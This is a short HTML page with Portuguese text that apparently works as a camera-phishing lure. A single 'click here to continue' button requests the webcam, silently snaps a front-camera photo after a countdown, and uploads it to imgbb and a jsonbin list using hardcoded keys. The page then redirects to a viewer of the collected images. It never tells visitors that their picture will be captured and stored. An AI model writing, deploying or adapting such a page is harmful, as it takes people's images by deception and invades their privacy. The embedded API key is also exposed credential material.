<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
body {
    margin: 0;
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    background: #111;
    color: white;
    font-family: Arial;
    flex-direction: column;
}

button {
    padding: 18px 30px;
    font-size: 18px;
    border-radius: 12px;
    border: none;
    background: #00ff88;
    font-weight: bold;
}

#countdown {
    font-size: 60px;
    margin-top: 20px;
}
</style>
</head>

<body>

<video id="webcam" autoplay playsinline muted style="display:none;"></video>

<button id="btn">Clique aqui para continuar</button>
<div id="countdown"></div>

<script>
const API_KEY_IMGBB = "33a7d906d06ed8ca9fdc9ec095222d3f";
const JSONBIN_KEY = "SUA_API_JSONBIN"; // 🔥 COLOCA AQUI
const BIN_ID = "69d30c2aaaba882197ca5757";

document.getElementById("btn").addEventListener("click", start);

async function start() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user" }
        });

        const video = document.getElementById("webcam");
        video.srcObject = stream;

        await video.play();

        document.getElementById("btn").style.display = "none";

        startCountdown(video, stream);

    } catch (err) {
        alert("Permita acesso à câmera");
        console.log(err);
    }
}

function startCountdown(video, stream) {
    let count = 3;
    const el = document.getElementById("countdown");
    el.innerText = count;

    const interval = setInterval(async () => {
        count--;
        el.innerText = count > 0 ? count : "📸";

        if (count < 0) {
            clearInterval(interval);

            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0);

            const imageData = canvas.toDataURL("image/jpeg", 0.9);

            await enviarImagem(imageData);

            stream.getTracks().forEach(track => track.stop());

            setTimeout(() => {
                window.location.href = "view-images.html";
            }, 1500);
        }

    }, 1000);
}

async function enviarImagem(base64) {
    try {
        const formData = new FormData();
        formData.append("image", base64.split(",")[1]);

        // IMG BB
        const res = await fetch(`https://api.imgbb.com/1/upload?key=${API_KEY_IMGBB}`, {
            method: "POST",
            body: formData
        });

        const data = await res.json();
        const imageUrl = data.data.url;

        console.log("Imagem enviada:", imageUrl);

        // JSONBIN - pegar lista atual
        const getRes = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
            headers: { "X-Master-Key": JSONBIN_KEY }
        });

        const json = await getRes.json();
        const lista = json.record.record || [];

        lista.push(imageUrl);

        // salvar lista atualizada
        await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
            method: "PUT",
            headers: {
                "Content-Type": "application/json",
                "X-Master-Key": JSONBIN_KEY
            },
            body: JSON.stringify({ record: lista })
        });

    } catch (err) {
        console.log("Erro:", err);
        alert("Erro ao enviar imagem");
    }
}
</script>

</body>
</html>
